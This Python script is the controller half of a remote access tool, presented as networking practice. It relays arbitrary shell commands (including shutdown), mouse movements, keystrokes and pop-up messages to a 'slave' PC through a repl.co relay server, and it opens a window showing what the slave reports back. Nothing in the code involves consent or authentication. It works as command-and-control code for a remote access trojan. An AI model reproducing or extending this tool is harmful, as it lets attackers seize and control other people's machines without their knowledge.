"""
date : 27-11-2022
developer : scihack - alt powerpizza
purpose : practice networking and logic making via python
"""

import requests, json, threading, datetime
from pynput.mouse import Listener
import tkinter
from tkinter import *

CMD_Refer = """\n
Commands :-
1) any shell command which not produce output like explorer.exe, shutdown /s
usage :
explorer.exe
shutdown /s
etc

2) traceMouse.begin => for connect mouse of controller to slave's PC
usage :
traceMouse.begin

3) typeText => for send keyboard key events to slave.
usage :
typeText your_text
** space can also be sendable

4) launch-output-panel => for open output panel where you see text recieved from slave
usage: 
launch-output-panel

5) showMSG => for show message to slave as a message box (alert)
usage :
showMSG your_text

\n"""

print(CMD_Refer)
url = "https://DINO-INO.scihack.repl.co"
data_ = requests.get(url)
print(data_.text)

def openOutputWindow():
    root = tkinter.Tk()
    root.title("Output Window")
    root.wm_resizable(0, 0)
    root.geometry("300x400")
    root.config(bg="red")

    def onclose():
        nonlocal is_running
        is_running = 0
        root.update()
        root.destroy()
    root.protocol("WM_DELETE_WINDOW", onclose)

    is_running = 1
    def reportReciever():
        while is_running:
            try:
                data_ = json.loads(requests.post(url+"/getSlaveMessage", "1").text)
                if data_["msg"] != None:
                    # console_.delete("1.0", END)
                    to_show = "\n" + str(datetime.datetime.now()).split(".")[0] + " -- " + data_["msg"] + "\n"
                    console_.insert(END, to_show)
            except BaseException as e:
                print("error while recieving slave : ", e)
    console_ = Text(root, width=35, height=24)
    console_.place(x=5, y=5)
    threading.Thread(target=reportReciever).start()
    # data_ = requests.post(url+"/getSlaveMessage", 1)

    root.mainloop()

threading.Thread(target=openOutputWindow).start()

while 1:
    cmd = input("Enter command:- ")
    if cmd == "traceMouse.begin":
        print("Running mouse tracer, Hit enter to stop\n")
        def sendMouseTraced():
            posit = (0, 0)
            def sendTracedData():
                while cmd == "traceMouse.begin":
                    requests.post(url+"/setCurrentCMD", json.dumps({"CMD": "traceMouse.begin", "target": None, "position": posit}))
            def changePosit(*d):
                nonlocal posit
                posit = d
            ms_lst = Listener(on_move=changePosit)
            ms_lst.start()
            threading.Thread(target=sendTracedData).start()
            while 1:
                if cmd != "traceMouse.begin":
                    print("Stoped tracer")
                    ms_lst.stop()
                    break
        threading.Thread(target=sendMouseTraced).start()

    elif cmd == "help":
        print(CMD_Refer)

    elif cmd.lower() == "launch-output-panel".lower():
        threading.Thread(target=openOutputWindow).start()

    else:
        to_send = {"CMD": cmd, "target": None}
        res = requests.post(url+"/setCurrentCMD", json.dumps(to_send))
        if res.text != "OK":
            print("ERROR :- ", res.text, end="\n\n")